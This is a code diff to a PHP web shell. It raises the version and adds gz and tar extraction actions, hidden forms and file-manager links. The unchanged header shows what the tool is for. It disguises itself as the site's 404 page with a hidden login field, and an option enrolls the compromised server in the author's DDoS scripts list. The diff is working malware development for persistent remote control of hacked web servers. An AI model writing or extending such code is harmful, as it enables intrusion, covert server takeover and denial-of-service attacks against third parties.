@@ -1,6 +1,6 @@
 <?php
 $pass               = md5("pw");
-$version            = 2.86;
+$version            = 2.87;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -383,6 +383,14 @@ function unzipfile(unzipfile){
 	$(\'unzipfile\').unzipfile.value=unzipfile;
 	$(\'unzipfile\').submit();
 }
+function ungzfile(ungzfile){
+	$(\'ungzfile\').ungzfile.value=ungzfile;
+	$(\'ungzfile\').submit();
+}
+function untarfile(untarfile){
+	$(\'untarfile\').untarfile.value=untarfile;
+	$(\'untarfile\').submit();
+}
 function copyfolder(srcdir){
 	var tofolder;
 	tofolder = prompt(\'Original folder:\'+srcdir+\'\\nPlease input object folder (fullpath):\', \'\');
@@ -729,6 +737,21 @@ if ($action == 'phpinfo') {
         } else {
             m("The file could not be unzipped...");
         }
+    } elseif (isset($ungzfile)) {
+        $p = new PharData($ungzfile);
+        $p->decompress();
+        if (file_exists(rtrim($ungzfile, ".gz"))){
+            m("File successfully uncompressed!");
+        } else {
+            m("The file could not be uncompressed...");
+        }
+    } elseif (isset($untarfile)) {
+        $p = new PharData($untarfile);
+        if ($p->extractTo(rtrim($untarfile,".tar")) . "/"){
+            m("File successfully extracted!");
+        } else {
+            m("The file could not be extracted...");
+        }
     } elseif ($curfile && $tarfile) {
         if (!@file_exists($curfile) || !@file_exists($tarfile)) {
             m('The goal file has already existed or original file does not exist');
@@ -829,6 +852,18 @@ if ($action == 'phpinfo') {
         'name' => 'unzipfile'
     ));
     makehide('unzipfile');
+    makehide('dir', $nowpath);
+    formfoot();
+    formhead(array(
+        'name' => 'ungzfile'
+    ));
+    makehide('ungzfile');
+    makehide('dir', $nowpath);
+    formfoot();
+    formhead(array(
+        'name' => 'untarfile'
+    ));
+    makehide('untarfile');
     makehide('dir', $nowpath);
     formfoot();
     formhead(array(
@@ -1129,6 +1164,12 @@ function shownav(e){
             p('<td nowrap>');
             if(endsWith($filedb['filename'],".zip")){
                 p('<a href="javascript:unzipfile(\'' . str_replace("'", "\'", $filedb['server_link']) . '\');">Unzip</a> | ');
+            }
+            if(endsWith($filedb['filename'],".gz")){
+                p('<a href="javascript:ungzfile(\'' . str_replace("'", "\'", $filedb['server_link']) . '\');">Un-GZ</a> | ');
+            }
+            if(endsWith($filedb['filename'],".tar")){
+                p('<a href="javascript:untarfile(\'' . str_replace("'", "\'", $filedb['server_link']) . '\');">Un-Tar</a> | ');
             }
             p('<a href="javascript:dofile(\'downfile\',\'' . str_replace("'", "\'", $filedb['server_link']) . '\');">Download</a> | ');
             p('<a href="javascript:copyfile(\'' . str_replace("'", "\'", $filedb['server_link']) . '\');">Copy</a> | ');
